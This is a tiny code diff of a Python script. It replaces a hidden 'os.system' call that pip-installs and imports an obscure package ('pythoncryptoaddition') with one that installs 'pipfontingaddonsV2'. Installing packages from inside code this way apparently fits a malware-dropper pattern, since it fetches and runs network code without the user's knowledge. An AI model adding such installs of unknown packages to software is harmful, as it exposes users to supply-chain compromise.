@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptoaddition")
-import pythoncryptoaddition
+os.system("pip install pipfontingaddonsV2")
+import pipfontingaddonsV2
 import random
 import requests
 import time
